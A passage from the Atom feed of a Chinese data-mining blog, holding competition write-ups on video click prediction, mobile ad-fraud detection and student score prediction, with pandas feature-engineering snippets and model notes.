align="center">0.7410879161463921</td></tr></tbody></table><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>这一题数据量比较大，模型训练起来也比较慢，所以针对 lgb 模型准备了两套参数，一套学习率比较大用于快速迭代验证特征效果，训练一次大概在半小时左右，线上分数0.825。另外一套学习率为0.01的参数用于正式提交，运行一次大概需要15小时，线上分数0.8377。</p><h3 id="穿越特征"><a href="#穿越特征" class="headerlink" title="穿越特征"></a>穿越特征</h3><p>前面说过，这题常规特征收益很小，但由于数据给出了视频曝光时间（ts），所以可以借助其构造大量穿越特征，或者称作为视频点击后的模式特征。基本构造方法就是计算距离下一次视频曝光的时间差。这么做的原因也很好理解，假如一个人点击了某个视频，那么必然会观看一段时间，那么距离下一次视频的曝光就会久一点，ts 差值也较大。相反，连续两次视频的曝光时间间隔应该很小。距离上次视频的曝光时间差也是有效的，根据 APP 的推荐规则，在点击视频后下次推荐的也是相关视频，从而再次点击的可能性较大。我们构造了大量组合下的视频曝光时间间隔，曝光跨度也从1往后扩展，主要构造如下特征：</p><ul><li>deviceid 前x次曝光到当前的时间差</li><li>deviceid netmodel 前x次曝光到当前的时间差</li><li>deviceid 后x次曝光到当前的时间差</li><li>deviceid pos 后x次曝光到当前的时间差</li><li>deviceid netmodel 后x次曝光到当前的时间差</li><li>deviceid netmodel pos 后x次曝光到当前的时间差</li><li>deviceid lng_lat 后x次曝光到当前的时间差</li><li>deviceid lng_lat pos 后x次曝光到当前的时间差</li></ul><p>除 ts 是个强特征之外，pos 也是强特。pos 取值范围为0 ～ 8，取值分布如图2左所示。抓包分析可知0 ～ 3这四个值对应首页推荐四个位置，但从图2右可以看到界面大小最多只够显示2个半，有曝光才有流量，所以才会导致 pos 取0，1，2的数据量相较于3较大。pos中的其他取值并没有找到在何处产生，猜想可能来自于相关推荐视频点击或者消息栏推送点击。进一步分析在不同 pos 下的点击率，如图3所示。可以看出同样是首页推荐位置，位置3虽然总数据不多，但点击率远高于其他首页位置。初步猜想大部分用户可能只打开看了一下，只看到首页屏幕大小展示的三个视频，并不会下滑查看更多推荐，所以才会出现0 ～ 2的数据量大，但点击率非常低的情况。对于深度使用用户，其要么出于完成任务拿奖励的目的还是正常使用，点击欲望相对更高，这部分用户在使用探索中会更多地看到 pos 3以上的视频。</p><center class="half">    <img src="http://pic.logicjake.xyz/pos%E5%88%86%E5%B8%83.png" style="margin: auto;max-width: 30%; margin-right:10%;"/><img src="http://pic.logicjake.xyz/%E8%A7%86%E9%A2%91%E4%BD%8D%E7%BD%AE.jpg" style="margin: auto;max-width: 30%;"/>    <div style="margin: 2%">图2 左：pos 取值分布；右：app 视频展示位</div></center><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/pos%20%E7%82%B9%E5%87%BB%E7%8E%87.png" alt="图3 各pos是否点击分布" title="">                </div>                <div class="image-caption">图3 各pos是否点击分布</div>            </figure></div><p>效仿 ts 的穿越特征构造，我们又尝试构造了后x次视频曝光位置，同样效果也十分显著。仔细研究 APP 发现，假如你不是直接在首页点击播放视频，而是点击进入该视频的详情页，同样会触发视频观看，同时在视频详情页下会出现相关推荐视频，如图4红框所示。综上猜测，pos 中某些取值对应于相关推荐位，所以当下次视频曝光位置为上述相关推荐位，则表示当次视频一定是被用户点击观看的。</p><div style="margin: auto;max-width: 30%; "><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E7%9B%B8%E5%85%B3%E6%8E%A8%E8%8D%90.jpg" alt="图4 相关推荐" title="">                </div>                <div class="image-caption">图4 相关推荐</div>            </figure></div><p>通过学习上述两大类穿越特征，模型的效果已然十分明显，在快速迭代模型上，已经能够达到0.80114的分数。相较于最高分0.825，说明常规特征带来的收益只能提高0.024。穿越特征只有30+，但常规特征却有140左右，收益对比一目了然。工程实践中穿越特征自然无法使用，但作为一项数据挖掘比赛，当然是追求已有数据的最大化利用。</p><p>除了上述两大类穿越特征，还构造了下一次视频曝光的网络环境和基于经纬度的位置变化。</p><h3 id="历史特征"><a href="#历史特征" class="headerlink" title="历史特征"></a>历史特征</h3><p>历史特征主要用过去一个时间单位的数据进行统计，然后作为当前时刻的特征。由于数据中昨日老用户占比较多，所以本方案大量构造了昨日数据统计特征。在这部分特征中大量涉及到各种点击率的构造，点击率使用到了标签数据，因此相较于全局统计点击率，构造昨日点击率避免了标签泄露和数据穿越问题。主要构造的点击统计特征如下：</p><ul><li>deviceid 点击次数，点击率</li><li>deviceid, hour 点击率</li><li>deviceid, netmodel 点击率</li><li>newsid 点击次数，点击率</li><li>next_pos 点击率</li></ul><p>原数据给出了两个时间特征，一个是视频曝光时间 ts 和视频假如被点击时的点击时间 timestamp。二者的差值可以表示用户的反应时间，反应时间越短说明用户越喜欢该类视频。针对反应时间分别以 deviceid 和 newsid 为单位构造统计特征，构造方式包括：max，min，mean，std，median，kurt 和 quantile。反应时间从用户侧提取，所以针对 newsid 做统计误差较大，效果不明显，所以只保留了 std 统计。</p><p>除了以天为单位构造昨日数据特征，还以小时为单位构造上一小时的统计特征，尝试下来只有上一小时的 deviceid 点击次数和点击率有点效果。</p><h3 id="count-统计"><a href="#count-统计" class="headerlink" title="count 统计"></a>count 统计</h3><p>这部分特征以不同时间单位进行 count 统计，时间单位包括：10分钟，小时，天，全局。不同于历史特征，这部分 count 统计往往会出现数据穿越问题。count 特征主要反应偏好属性，比如今天哪个视频曝光量大，用户倾向于在哪个时间，哪个网络环境下使用 APP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'newsid'</span>, <span class="string">'pos'</span>], </span><br><span class="line">            [<span class="string">'deviceid'</span>, <span class="string">'guid'</span>, <span class="string">'newsid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'next_pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_day_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>], [<span class="string">'guid'</span>], [<span class="string">'deviceid'</span>, <span class="string">'pos'</span>], [<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_minute10_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'day'</span>, <span class="string">'hour'</span>, <span class="string">'minute10'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'netmodel'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_hour_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby([<span class="string">'hourl'</span>] + f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br><span class="line">    </span><br><span class="line">cat_list = [[<span class="string">'deviceid'</span>, <span class="string">'group'</span>, <span class="string">'pos'</span>]]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> tqdm(cat_list):</span><br><span class="line">    df_feature[<span class="string">'&#123;&#125;_count'</span>.format(<span class="string">'_'</span>.join(f))] = df_feature.groupby(f)[<span class="string">'id'</span>].transform(<span class="string">'count'</span>)</span><br></pre></td></tr></table></figure><h3 id="embedding-特征"><a href="#embedding-特征" class="headerlink" title="embedding 特征"></a>embedding 特征</h3><p>作为推荐中重要的一方，数据集给出的视频信息十分少，只有一列简单的视频 id，并没有视频分类之类的对推荐重要的属性信息，所以我们只能从视频被推荐给哪些用户下手。以视频为单位，找出被推荐的用户列表，每个列表作为句子喂到 Word2Vec 模型得到每个用户的 embedding 向量，用视频所有被推荐的用户的 embedding 向量平均值表示视频。得到 embedding 之后，就可以度量两个视频之间的相似度，所以也就产生了另外一种思路，当一个新视频被推荐给用户后，计算新视频与之前用户被推荐过（或者看过）的视频的平均相似度，平均相似度越大，用户点击的可能性越大。但在实际试验中效果不好，也不知道是不是 embedding 效果达不到的原因。</p><h3 id="user-表的打开方式"><a href="#user-表的打开方式" class="headerlink" title="user 表的打开方式"></a>user 表的打开方式</h3><p>这一题特征构造主要还是围绕 train 表做的，user 表打开过多次都没啥效果。用户画像属性 tag 和 outertag 维度特别高，尝试过 PCA 降维和各种 embedding 方式都不行，最后还是采用的开源方法，对 tag 的分数做一些简单的统计。app 表的 applist 维度更高，也是各种尝试无效。</p><h3 id="其他特征"><a href="#其他特征" class="headerlink" title="其他特征"></a>其他特征</h3><p>我们根据连续使用将用户的使用时间分段，曝光时间间隔少于3分钟的视为同一个使用时段。然后统计每个使用时段中上一次曝光时间差的 mean 和 std 特征。还统计了每个用户下一次曝光时间差的 mean，std，median，skew。针对曝光时间差的统计可以反应用户当前使用时段或者整体上的视频观看时长信息。</p><p>此外还构造了用户平均每小时被曝光多少视频，该视频是一小时内被曝光给用户的第几个视频，今日曝光给用户的视频量与昨日曝光给用户的视频量的差值，未来一小时用户在该网络环境下的视频曝光数量。</p><p>当然也有许多尝试后效果不好的操作，比如数据集给出了用户的设备信息：设备厂商，设备版本，可以效仿<a href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">科大讯飞反欺诈</a>中的操作，对其进行数据处理，但可能由于自身重要性就不大，数据处理也没啥用。借助百度地图 api 可以将数据集中的经纬度转化成具体的城市，也没啥效果。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>这题主要有两种建模方式，一种是常规的五折交叉验证，在划分每折数据时，按 day 所占比例划分比以是否点击比例划分要好，可以让每折模型学习到三天的数据，做到时间上同分布。另一种按时间划分，线下用8，9两天的数据做训练集，10号数据做验证集，保留模型的最优迭代次数，然后线上模型用完整的三天数据预测测试集。对比来看，第二种验证集划分方式和线上更为相似，所以与线上分数 gap 较小，训练时间也更短，所以我们主要使用第二种建模方式。但第一种可以得到全数据集上的点击概率，可以作为新的特征加到数据集中，可以提升0.002-0.003。需要注意的是假如采用这种方式集成，五折模型的学习率不能太小，否则模型效果足够好导致概率值特征过强，使得时间划分模型直接拟合概率值，过早早停，无法学习其他特征。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人感觉，受限于 APP 的用户体验，单纯的用户属性对预测作用不大，这也是为什么 app 表和 user 无法正确打开的原因。所以我们需要从用户的行为数据（也就是 train 表）构造特征，但行为数据中也有大量不可信操作。有些用户为了完成 APP 的任务拿奖励，会随意点击观看视频，这部分行为完全随机，无法从中正确提炼出用户的兴趣所在，也就很难去预测未来的点击行为。但用户观看视频后的模式是固定的，视频的播放时间是必定有的，所以 ts 的时间差是可信的。点击视频详情页出现的相关视频推荐也是必然存在的（这是我猜测的，可能不正确），所以下一次视频曝光的 pos 也是可信的。所以这一题常规特征干不过穿越特征，无法过于信任用户行为，只能信任机器行为。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.turingtopia.com/models/details/notebook/b698f36b82f846e087cc349f91d0eba0" target="_blank" rel="noopener">比赛初期0.65开源</a><br><a href="https://www.turingtopia.com/models/details/notebook/417565783ede4251a7ef268019355259" target="_blank" rel="noopener">天才儿童0.81高分开源</a><br><a href="https://www.turingtopia.com/models/details/notebook/d854d4fd5b4e401ca20e944c4b353cbd" target="_blank" rel="noopener">user 表处理方式开源</a><br><a href="https://www.bilibili.com/video/av78282108" target="_blank" rel="noopener">麻婆豆腐视频讲解</a></p>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[国能日新第二届光伏功率预测赛-赛后总结]]></title>
        <updated>2020-03-04T09:15:52+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9dd89417eb77692e7fd18886c7e9e4efa9435cddd62672584cfe786668a76610"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2019科大讯飞移动广告反欺诈算法挑战赛算法-赛后总结]]></title>
        <updated>2020-03-04T09:15:52+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>最终成绩：复赛第二，决赛亚军。<br>比赛地址：<a href="http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD" target="_blank" rel="noopener">http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD</a></p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>讯飞AI营销云基于深耕多年的人工智能和大数据技术，赋予营销智慧创新的大脑，以健全的产品矩阵和全方位的服务，帮助广告主用AI+大数据实现营销效能的全面提升，打造数字营销新生态。</p><p>广告欺诈是数字营销面临的一个重大挑战，随着基础技术的成熟化（篡改设备信息、IPv4服务化、黑卡、接码平台等），广告欺诈呈现出规模化、集团化的趋势，其作弊手段主要包括机器人、模拟器、群控、肉鸡/后门、众包等。广告欺诈不断蚕食着营销生态，反欺诈成为数字营销领域亟待突破的关键问题。</p><a id="more"></a><h1 id="数据说明"><a href="#数据说明" class="headerlink" title="数据说明"></a>数据说明</h1><p>本次比赛为参赛选手提供了5类数据：基本数据、媒体信息、时间、IP信息和设备信息。基本数据提供了广告请求会话sid，以及“是否作弊”的标识。媒体信息、时间、IP信息和设备信息等4类数据，提供了对作弊预估可能有帮助的辅助信息。</p><p>出于数据安全保证的考虑，所有数据均为脱敏处理后的数据。数据集提供了若干天的样本，最后一天数据用于预测，不提供“是否作弊”标识，其余日期的数据作为训练数据。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="数据预处理"><a href="#数据预处理" class="headerlink" title="数据预处理"></a>数据预处理</h2><p>这一题数据预处理占了很多篇幅，主要包括两部分：对无意义字符或乱码的处理；基于业务需要的数据处理。在我们的方案中，着重对操作系统（osv），手机制造厂商（make）和机型（model）进行处理。有些 osv 包含无意义的字段，比如“??????????????????????????؉*o\x18”或“..þ\x06&lt;þ\x1f&lt;þf&lt;þ`&lt;þ]&gt;þܾþ\x08?þ2?þz?þ|?þ\u07ffþ?þ”，我们直接将其全部替换成-1。osv 主要由“.”分隔的数字组成，如7.1.9的形式，但在实际数据中包含一些由其他字符甚至字母分隔的osv，将这些分隔符替换成“.”，保证统一性。</p><p>make 最主要的问题是同一厂商下的中英文名称共存，比如“华为”和“huawei”没有必要认为其是两个不同的厂商（滑稽），所以统一将中文名称转成小写英文名称。此外对于一些过于精细化的分类进行粗放，比如“荣耀”归到“huawei”，“m1”，“m2”，“m3”全都归到“xiaomi”。</p><p>model 大部分数据格式都是“厂商 具体机型”，但很多数据都是采用厂商自己独有的编号，比如 OPPO 就有“PACM00”，“PBAM00”…因为 OPPO 这类数据较多，所以特意对其进行标准格式转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACM00'</span>,<span class="string">"OPPO R15"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBAM00'</span>,<span class="string">"OPPO A5"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBEM00'</span>,<span class="string">"OPPO R17"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PADM00'</span>,<span class="string">"OPPO A3"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBBM00'</span>,<span class="string">"OPPO A7"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PAAM00'</span>,<span class="string">"OPPO R15_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACT00'</span>,<span class="string">"OPPO R15_2"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PABT00'</span>,<span class="string">"OPPO A5_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBCM10'</span>,<span class="string">"OPPO R15x"</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>以上三列数据还存在一个共有问题：存在一些 url 编码字符，将其转换成对应的字符。另外对于’h’, ‘w’, ‘ppi’这些数值属性的缺失值，采用同一设备生产厂商下该属性的平均值填充。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>这一题有个明显的特点就是类别特征特别多，众所周知 catboost 擅长处理类别特征，所以直接将原始特征喂到 catboost，相对于其他模型效果非常好。在我的理解中，判断欺诈行为，其实就是通过多因素的累加来逐步确认欺诈的可能性，比如说来自某个城市的点击欺诈行为可能性为20%，假如其同时又是使用的某个欺诈行为频繁的机型，则欺诈可能性就又会提高。所以在这题中，对类别特征进行大量的交叉组合是有效的，这也是为什么 catboost 的效果要好，catboost 会自动进行类别特征的组合。在比赛交流群，有人问既然 catboost 已经能够完成特征组合，那么特征工程还有必要做大量的组合特征吗？我认为是必要的，这个道理其实和“深度模型理论上能够完成特征的高阶组合，但在比赛中人工特征工程还是存在的”一样，都是为了在源头上降低拟合的难度，提升性能的上限。</p><p>我们还可以根据 count 和 nunique 来挖掘欺诈行为，比如 imei 是手机串号，一部手机对应一个唯一的 imei。欺诈团伙为了躲避制裁往往会刷机，从而改变 model 值，比如将原本的华为手机刷成小米。针对以上行为，我们可以统计 imei 有多少个不同的 model ，通过这个特征判断这是一个存在刷机行为的设备。类似的，针对设备挂代理可以统计 imei 有多少个不同的 city。我们也可以构造其他特征来寻找欺诈行为，比如欺诈团伙会同时控制大量的手机进行广告点击，因此会大量采购某些价廉的机型，对应的这些机型会点击大量且不同的广告。这都是可以通过 count 和 nunique 特征和正常点击行为分开的，因为正常的用户不会去点击那么多广告。</p><p>除了 count 和 nunique 统计特征，还可以模仿点击率构造欺诈率特征，比如某个 model 或者 city，欺诈次数占总次数的比率。构造欺诈率特征的出发点来自赛题背景中所说的“广告欺诈呈现出规模化、集团化的趋势”，规模化，集团化的显著特点就是欺诈行为集中在某个城市，大量使用某个机型进行欺诈。此外，赛题中的 ip 信息也可以用来发现规模化，集团化行为，ip 能给出很多有用信息，比如 ip 能反应运营商，设备所在网段，从而反应这部分设备是否处在一个大量且集中的环境下，如下图所示。所以可以对 ip 按’.‘进行分段，取前一个，前两个，前三个作为新的网段类别特征，相较于 city 进一步细化了集团化，规模化概念。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E6%89%8B%E6%9C%BA%E9%9B%86%E7%BE%A4.jpg" alt="手机集群（图片来自网络）" title="">                </div>                <div class="image-caption">手机集群（图片来自网络）</div>            </figure></div><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>这题毫无疑问采用 catboost 比较好，但巨大的数据量加上大量的类别特征导致十分吃内存，模型训练完成回退到最优迭代轮次的时候经常内存溢出。初赛的时候采用 lgb 和 catboost 进行投票，到复赛直接就 catboost 但模型了。最后复赛 A 榜98.26379，B 榜98.24133，还是很稳定的。 </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>观看现场前三的答辩，总体思路上大家都差不多。第三名队伍小兔子乖乖采用了“伪标签”，将测试集当中预测概率值大于0.999的作为正样本，小于0.001的作为负样本加入到训练集重新训练，提高了训练集的数据量，这一做法使得模型效果提高了0.0035左右。第一名直接是一个公司组的队伍，其主要亮点就在于通过部分有规则碰撞的方式还原 MD5 加密了的 imei，然后对还原后的 imei 进行截断，具体流程见下图。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E1.png" alt="imei 逆向1" title="">                </div>                <div class="image-caption">imei 逆向1</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E2.png" alt="imei 逆向2" title="">                </div>                <div class="image-caption">imei 逆向2</div>            </figure></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.zhihu.com/question/364517083" target="_blank" rel="noopener">DNN可以进行高阶特征交互，为什么Wide&amp;Deep和DeepFM等模型仍然需要显式构造Wide部分？</a></li><li><a href="https://1024.iflytek.com/h5/" target="_blank" rel="noopener">现场决赛录播</a></li></ul>]]></content>
        <author>
            <name><![CDATA[LogicJake’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/01/01/tianyicup-education/</id>
        <title><![CDATA[“添翼”杯人工智能创新应用大赛-智慧教育赛道赛后总结]]></title>
        <updated>2020-03-04T09:15:52+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/01/01/tianyicup-education/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/01/01/tianyicup-education/"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我接触数据挖掘后的第一个与之有关的比赛，很标准的表格题，业务背景也不复杂，自我感觉非常适合像我这样的新人去完整地了解，熟悉数据挖掘比赛的整体流程。我也是在这次比赛中慢慢了解特征工程的重要性，也了解并应用了一些基础的特征构造方法，也第一次听说并使用（还没探索其背后的原理）那些个 boosting 模型：xgboost，catboost，lightgbm。</p><a id="more"></a><p>在比赛中也认识了队友，油菜花和勇哥，团队带来的学习增益和激励增益是庞大的，队友积累的经验和知识也是一笔巨大的财富。</p><p>最终成绩：复赛第三，决赛三等奖。</p><p>代码地址：<a href="https://github.com/LogicJake/tianyicup-education" target="_blank" rel="noopener">https://github.com/LogicJake/tianyicup-education</a></p><h1 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h1><p>随着人工智能(AI)的发展，“AI＋教育”“智慧课堂”等名词逐渐出现在大众视野，越来越多的学校将人工智能助手融入课堂，当下中国正逐步进入“智慧教育”时代。在传统课堂中，由于时间和精力的限制，老师和家长无法兼顾学生的学习状态和学业进展，不会关注大量对于学生能反应其真实问题和情况的数据。</p><p>智慧教育通过将传统教育行业的场景和当下最新的人工智能算法紧密结合，深度挖掘学生在各个知识点上的历史答题表现数据，最终预测学生在考试中的分数表现。</p><h1 id="赛题描述"><a href="#赛题描述" class="headerlink" title="赛题描述"></a>赛题描述</h1><p>请参赛选手，利用比赛对应训练集提供的学生信息、考试知识点信息、考试总得分信息等建立模型，预测测试集中学生在指定考试中的成绩总分，预测目标如下：</p><p>初赛：利用初中最后一年的相关考试和考点信息，预测初中最后一学期倒数第二、第三次考试的成绩。<br>复赛：利用初中 4 年中的相关考试和考点信息，预测初中最后一学期最后一次考试的的成绩。</p><h1 id="数据下载"><a href="#数据下载" class="headerlink" title="数据下载"></a>数据下载</h1><p><a href="https://www.kesci.com/urls/740cd3de" target="_blank" rel="noopener">初赛数据下载（右键保存下载）</a>，复赛数据不可下载。</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="简单的数据分析"><a href="#简单的数据分析" class="headerlink" title="简单的数据分析"></a>简单的数据分析</h2><table><thead><tr><th align="center">课程类别</th><th align="center">课程名称</th><th align="center">知识点数量</th></tr></thead><tbody><tr><td align="center">course_class1</td><td align="center">course1</td><td align="center">368</td></tr><tr><td align="center"></td><td align="center">course2</td><td align="center">367</td></tr><tr><td align="center"></td><td align="center">course3</td><td align="center">262</td></tr><tr><td align="center">course_class2</td><td align="center">course4</td><td align="center">219</td></tr><tr><td align="center"></td><td align="center">course5</td><td align="center">335</td></tr><tr><td align="center"></td><td align="center">course6</td><td align="center">146</td></tr><tr><td align="center"></td><td align="center">course7</td><td align="center">316</td></tr><tr><td align="center"></td><td align="center">course8</td><td align="center">223</td></tr></tbody></table><p>课程数据包括课程类别，课程名称和所包含的知识点。课程类别只有两类，大概率就是理科和文科的区别。主要难点在于课程的知识点维度非常大，课程考试虽然每次只包含少量的知识点，但是为了向量空间统一，假如采用01向量表示考试的知识点分布情况，该向量将是巨维且十分稀疏的。</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/education_1.png" alt="成绩分布" title="">                </div>                <div class="image-caption">成绩分布</div>            </figure></div><p>该数据集还有个好处就是数据完整，不存在数据缺失或异常值的情况，除了标签数据‘成绩’出现了0分。从上图成绩分布可以看到，大部分成绩都在60分以上，60以下的就很稀疏。我们将0分看做异常值，可以认为是由学生缺考或者作弊被取消成绩导致的，这部分0分数据不能代表学生正常的考试水平且模型也学习不到这种无规律情况，所以将这部分数据进行剔除。由上面成绩分布可以知道，模型的预测也大概率集中在60以上，所以对于0分样本，计算出来的MSE指标非常大。所以这一题线上线下MSE分数差距比较大，可以确定线上测试集也包含了0分样本。当时曾经和队友讨论能否单独建模预测0分的出现，但效果很差，毕竟学生缺考和作弊行为也没法从给出的数据中推演出来（笑）。</p><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><h3 id="基础特征"><a href="#基础特征" class="headerlink" 